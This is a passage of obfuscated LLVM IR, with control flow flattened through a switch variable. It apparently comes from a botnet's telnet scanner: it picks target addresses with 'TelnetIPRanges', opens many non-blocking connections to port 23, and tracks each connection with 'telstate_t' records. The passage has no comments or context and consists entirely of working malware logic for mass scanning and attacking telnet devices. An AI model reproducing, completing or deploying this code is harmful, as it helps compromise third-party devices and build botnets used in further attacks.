  store i32 %1, i32* %4, align 4
  %24 = call i32 @getdtablesize() #5
  %25 = sub nsw i32 %24, 100
  store i32 %25, i32* %5, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* %4, align 4
  store i32 %27, i32* %.reg2mem18
  %switchVar = alloca i32
  store i32 1190028683, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 1190028683, label %first
    i32 662791078, label %30
    i32 -1748827849, label %32
    i32 -1706159860, label %48
    i32 -1710921077, label %53
    i32 180048996, label %67
    i32 -2142534417, label %70
    i32 -784937600, label %71
    i32 1189944424, label %72
    i32 -1897612456, label %73
    i32 2128887538, label %78
    i32 -2140900632, label %86
    i32 683497002, label %93
    i32 545847058, label %NodeBlock15
    i32 -1409578615, label %NodeBlock13
    i32 1938476834, label %NodeBlock11
    i32 -817748452, label %NodeBlock9
    i32 -1212967967, label %LeafBlock7
    i32 959264076, label %NodeBlock5
    i32 -586166923, label %NodeBlock3
    i32 -1583564266, label %NodeBlock1
    i32 -1491172307, label %NodeBlock
    i32 1471046874, label %LeafBlock
    i32 -1177413056, label %110
    i32 -439519034, label %119
    i32 1900720526, label %139
    i32 -16971876, label %148
    i32 425374227, label %169
    i32 -1963128333, label %174
    i32 761846982, label %183
    i32 365847466, label %188
    i32 -95813976, label %189
    i32 1138730879, label %190
    i32 -442251747, label %215
    i32 1211203218, label %216
    i32 -385168203, label %239
    i32 -207487932, label %244
    i32 1351072340, label %248
    i32 656995563, label %252
    i32 657013044, label %253
    i32 -1216178136, label %254
    i32 1284544446, label %263
    i32 -1004024031, label %264
    i32 -135645747, label %298
    i32 -2041065021, label %315
    i32 419967302, label %319
    i32 596188933, label %336
    i32 -34139424, label %337
    i32 -232083208, label %341
    i32 -2116333529, label %345
    i32 -2040469357, label %346
    i32 1728539195, label %357
    i32 539248675, label %361
    i32 2130035058, label %362
    i32 1894173113, label %377
    i32 -1354235828, label %392
    i32 1526547249, label %396
    i32 1924677246, label %400
    i32 779476873, label %401
    i32 1202035538, label %412
    i32 -1533976680, label %416
    i32 -1119904408, label %417
    i32 548094997, label %443
    i32 1792282092, label %447
    i32 383684580, label %456
    i32 1556256960, label %460
    i32 -1948503796, label %464
    i32 -2007819841, label %479
    i32 1318434991, label %494
    i32 -1508702618, label %498
    i32 18238822, label %502
    i32 426555680, label %503
    i32 224162849, label %514
    i32 561363088, label %518
    i32 1079626093, label %519
    i32 1947774230, label %545
    i32 -477340831, label %549
    i32 2131672852, label %558
    i32 706889512, label %562
    i32 1548676329, label %566
    i32 2086328609, label %581
    i32 -1701893330, label %596
    i32 -1100797620, label %600
    i32 -1152917812, label %609
    i32 -799717481, label %618
    i32 1864630515, label %622
    i32 268503893, label %648
    i32 -1525141084, label %649
    i32 1532351250, label %653
    i32 364692392, label %654
    i32 -1352694497, label %655
    i32 337708733, label %666
    i32 1326162784, label %670
    i32 -1934028010, label %671
    i32 -1747548595, label %685
    i32 2016031706, label %689
    i32 -152446464, label %716
    i32 1251249258, label %731
    i32 -1415658563, label %732
    i32 -529507423, label %741
    i32 2033864341, label %742
    i32 188604199, label %754
    i32 496785658, label %758
    i32 166057842, label %795
    i32 1361816481, label %804
    i32 1801551607, label %813
    i32 1085536906, label %836
    i32 680209231, label %837
    i32 1012513420, label %848
    i32 -2034511154, label %857
    i32 -1056324750, label %880
    i32 1421059343, label %884
    i32 585645136, label %NewDefault
    i32 -1638612649, label %885
    i32 941554686, label %886
    i32 1633623609, label %889
    i32 -300471711, label %890
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload19 = load volatile i32, i32* %.reg2mem18
  %28 = icmp sgt i32 %.reload, %.reload19
  %29 = select i1 %28, i32 662791078, i32 -1748827849
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %5, align 4
  store i32 -1748827849, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 1025) #5
  store i8* %38, i8** %17, align 8
  %39 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 1025, i32 1, i1 false)
  %40 = load i32, i32* %5, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %19, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  store %struct.telstate_t* %43, %struct.telstate_t** %.reg2mem20
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %44 = bitcast %struct.telstate_t* %.reload131 to i8*
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  store i32 -1706159860, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %6, align 4
  %50 = load i32, i32* %5, align 4
  %51 = icmp slt i32 %49, %50
  %52 = select i1 %51, i32 -1710921077, i32 -2142534417
  store i32 %52, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %6, align 4
  %55 = sext i32 %54 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %55
  %57 = bitcast %struct.telstate_t* %56 to i8*
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 32, i32 16, i1 false)
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = load i8*, i8** %17, align 8
  %63 = load i32, i32* %6, align 4
  %64 = sext i32 %63 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 9
  store i8* %62, i8** %66, align 8
  store i32 180048996, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %6, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %6, align 4
  store i32 -1706159860, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  store i32 -784937600, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 1189944424, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -1897612456, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %5, align 4
  %76 = icmp slt i32 %74, %75
  %77 = select i1 %76, i32 2128887538, i32 1633623609
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %6, align 4
  %80 = sext i32 %79 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %80
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %81, i32 0, i32 7
  %83 = load i32, i32* %82, align 16
  %84 = icmp eq i32 %83, 0
  %85 = select i1 %84, i32 -2140900632, i32 683497002
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = call i64 @time(i64* null) #5
  %88 = trunc i64 %87 to i32
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 7
  store i32 %88, i32* %92, align 16
  store i32 683497002, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %6, align 4
  %95 = sext i32 %94 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %95
  %97 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %96, i32 0, i32 2
  %98 = load i8, i8* %97, align 8
  %99 = zext i8 %98 to i32
  store i32 %99, i32* %.reg2mem132
  store i32 545847058, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload142 = load volatile i32, i32* %.reg2mem132
  %Pivot16 = icmp slt i32 %.reload142, 4
  %100 = select i1 %Pivot16, i32 -586166923, i32 -1409578615
  store i32 %100, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload137 = load volatile i32, i32* %.reg2mem132
  %Pivot14 = icmp slt i32 %.reload137, 6
  %101 = select i1 %Pivot14, i32 959264076, i32 1938476834
  store i32 %101, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload135 = load volatile i32, i32* %.reg2mem132
  %Pivot12 = icmp slt i32 %.reload135, 7
  %102 = select i1 %Pivot12, i32 1548676329, i32 -817748452
  store i32 %102, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload134 = load volatile i32, i32* %.reg2mem132
  %Pivot10 = icmp slt i32 %.reload134, 8
  %103 = select i1 %Pivot10, i32 -1934028010, i32 -1212967967
  store i32 %103, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload133 = load volatile i32, i32* %.reg2mem132
  %SwitchLeaf8 = icmp eq i32 %.reload133, 8
  %104 = select i1 %SwitchLeaf8, i32 -152446464, i32 585645136
  store i32 %104, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload136 = load volatile i32, i32* %.reg2mem132
  %Pivot6 = icmp slt i32 %.reload136, 5
  %105 = select i1 %Pivot6, i32 -1948503796, i32 1079626093
  store i32 %105, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload141 = load volatile i32, i32* %.reg2mem132
  %Pivot4 = icmp slt i32 %.reload141, 2
  %106 = select i1 %Pivot4, i32 -1491172307, i32 -1583564266
  store i32 %106, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload138 = load volatile i32, i32* %.reg2mem132
  %Pivot2 = icmp slt i32 %.reload138, 3
  %107 = select i1 %Pivot2, i32 2130035058, i32 -1119904408
  store i32 %107, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload140 = load volatile i32, i32* %.reg2mem132
  %Pivot = icmp slt i32 %.reload140, 1
  %108 = select i1 %Pivot, i32 1471046874, i32 657013044
  store i32 %108, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload139 = load volatile i32, i32* %.reg2mem132
  %SwitchLeaf = icmp eq i32 %.reload139, 0
  %109 = select i1 %SwitchLeaf, i32 -1177413056, i32 585645136
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %6, align 4
  %112 = sext i32 %111 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 3
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 1
  %118 = select i1 %117, i32 -439519034, i32 1900720526
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %6, align 4
  %121 = sext i32 %120 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 9
  %124 = load i8*, i8** %123, align 8
  store i8* %124, i8** %20, align 8
  %125 = load i32, i32* %6, align 4
  %126 = sext i32 %125 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %126
  %128 = bitcast %struct.telstate_t* %127 to i8*
  call void @llvm.memset.p0i8.i64(i8* %128, i8 0, i64 32, i32 16, i1 false)
  %129 = load i8*, i8** %20, align 8
  %130 = load i32, i32* %6, align 4
  %131 = sext i32 %130 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 9
  store i8* %129, i8** %133, align 8
  %134 = call i32 @TelnetIPRanges()
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %136
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %137, i32 0, i32 1
  store i32 %134, i32* %138, align 4
  store i32 1138730879, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %6, align 4
  %141 = sext i32 %140 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 3
  %144 = load i8, i8* %143, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 0
  %147 = select i1 %146, i32 -16971876, i32 -95813976
  store i32 %147, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %6, align 4
  %150 = sext i32 %149 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 4
  %153 = load i8, i8* %152, align 2
  %154 = add i8 %153, 1
  store i8 %154, i8* %152, align 2
  %155 = load i32, i32* %6, align 4
  %156 = sext i32 %155 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 5
  %159 = load i8, i8* %158, align 1
  %160 = add i8 %159, 1
  store i8 %160, i8* %158, align 1
  %161 = load i32, i32* %6, align 4
  %162 = sext i32 %161 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 5
  %165 = load i8, i8* %164, align 1
  %166 = zext i8 %165 to i64
  %167 = icmp eq i64 %166, 6
  %168 = select i1 %167, i32 425374227, i32 -1963128333
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i32, i32* %6, align 4
  %171 = sext i32 %170 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 3
  store i8 1, i8* %173, align 1
  store i32 -1963128333, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i32, i32* %6, align 4
  %176 = sext i32 %175 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 4
  %179 = load i8, i8* %178, align 2
  %180 = zext i8 %179 to i64
  %181 = icmp eq i64 %180, 6
  %182 = select i1 %181, i32 761846982, i32 365847466
  store i32 %182, i32* %switchVar
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %184 = load i32, i32* %6, align 4
  %185 = sext i32 %184 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %185
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %186, i32 0, i32 3
  store i8 1, i8* %187, align 1
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  store i32 -95813976, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 1138730879, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %191, align 4
  %192 = call zeroext i16 @htons(i16 zeroext 23) #10
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %192, i16* %193, align 2
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %195 = getelementptr inbounds [8 x i8], [8 x i8]* %194, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %195, i8 0, i64 8, i32 4, i1 false)
  %196 = load i32, i32* %6, align 4
  %197 = sext i32 %196 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 1
  %200 = load i32, i32* %199, align 4
  %201 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %202 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %201, i32 0, i32 0
  store i32 %200, i32* %202, align 4
  %203 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 0
  store i32 %203, i32* %207, align 16
  %208 = load i32, i32* %6, align 4
  %209 = sext i32 %208 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %209
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %210, i32 0, i32 0
  %212 = load i32, i32* %211, align 16
  %213 = icmp eq i32 %212, -1
  %214 = select i1 %213, i32 -442251747, i32 1211203218
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  store i32 941554686, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i32, i32* %6, align 4
  %218 = sext i32 %217 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 16
  %222 = load i32, i32* %6, align 4
  %223 = sext i32 %222 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 16
  %227 = call i32 (i32, i32, ...) @fcntl(i32 %226, i32 3, i8* null)
  %228 = or i32 %227, 2048
  %229 = call i32 (i32, i32, ...) @fcntl(i32 %221, i32 4, i32 %228)
  %230 = load i32, i32* %6, align 4
  %231 = sext i32 %230 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 0
  %234 = load i32, i32* %233, align 16
  %235 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %236 = call i32 @connect(i32 %234, %struct.sockaddr* %235, i32 16)
  %237 = icmp eq i32 %236, -1
  %238 = select i1 %237, i32 -385168203, i32 1351072340
  store i32 %238, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = call i32* @__errno_location() #10
  %241 = load i32, i32* %240, align 4
  %242 = icmp ne i32 %241, 115
  %243 = select i1 %242, i32 -207487932, i32 1351072340
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i32, i32* %6, align 4
  %246 = sext i32 %245 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %246
  call void @reset_telstate(%struct.telstate_t* %247)
  store i32 656995563, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i32, i32* %6, align 4
  %250 = sext i32 %249 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %250
  call void @advance_telstate(%struct.telstate_t* %251, i32 1)
  store i32 656995563, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  store i32 -1638612649, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  store i32 -1216178136, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %256 = getelementptr inbounds [16 x i64], [16 x i64]* %255, i64 0, i64 0
  %257 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %256) #5, !srcloc !5
  %258 = extractvalue { i64, i64* } %257, 0
  %259 = extractvalue { i64, i64* } %257, 1
  %260 = trunc i64 %258 to i32
  store i32 %260, i32* %21, align 4
  %261 = ptrtoint i64* %259 to i64
  %262 = trunc i64 %261 to i32
  store i32 %262, i32* %22, align 4
  store i32 1284544446, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  store i32 -1004024031, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i32, i32* %6, align 4
  %266 = sext i32 %265 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %266
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %267, i32 0, i32 0
  %269 = load i32, i32* %268, align 16
  %270 = srem i32 %269, 64
  %271 = zext i32 %270 to i64
  %272 = shl i64 1, %271
  %273 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %274 = load i32, i32* %6, align 4
  %275 = sext i32 %274 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %275
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 16
  %279 = sdiv i32 %278, 64
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [16 x i64], [16 x i64]* %273, i64 0, i64 %280
  %282 = load i64, i64* %281, align 8
  %283 = or i64 %282, %272
  store i64 %283, i64* %281, align 8
  %284 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %284, align 8
  %285 = load i32, i32* %3, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %286, i64* %287, align 8
  %288 = load i32, i32* %6, align 4
  %289 = sext i32 %288 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %289
  %291 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %290, i32 0, i32 0
  %292 = load i32, i32* %291, align 16
  %293 = add nsw i32 %292, 1
  %294 = call i32 @select(i32 %293, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %294, i32* %7, align 4
  %295 = load i32, i32* %7, align 4
  %296 = icmp eq i32 %295, 1
  %297 = select i1 %296, i32 -135645747, i32 -34139424
  store i32 %297, i32* %switchVar
  br label %loopEnd

; <label>:298:                                    ; preds = %loopEntry
  %299 = call i64 @time(i64* null) #5
  %300 = trunc i64 %299 to i32
  %301 = load i32, i32* %6, align 4
  %302 = sext i32 %301 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 7
  store i32 %300, i32* %304, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %305 = load i32, i32* %6, align 4
  %306 = sext i32 %305 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %306
  %308 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %307, i32 0, i32 0
  %309 = load i32, i32* %308, align 16
  %310 = bitcast i32* %15 to i8*
  %311 = call i32 @getsockopt(i32 %309, i32 1, i32 4, i8* %310, i32* %14) #5
  %312 = load i32, i32* %15, align 4
  %313 = icmp ne i32 %312, 0
  %314 = select i1 %313, i32 -2041065021, i32 419967302
  store i32 %314, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i32, i32* %6, align 4
  %317 = sext i32 %316 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %317
  call void @reset_telstate(%struct.telstate_t* %318)
  store i32 596188933, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load i32, i32* %6, align 4
  %321 = sext i32 %320 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 0
  %324 = load i32, i32* %323, align 16
  %325 = load i32, i32* %6, align 4
  %326 = sext i32 %325 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 0
  %329 = load i32, i32* %328, align 16
  %330 = call i32 (i32, i32, ...) @fcntl(i32 %329, i32 3, i8* null)
  %331 = and i32 %330, -2049
  %332 = call i32 (i32, i32, ...) @fcntl(i32 %324, i32 4, i32 %331)
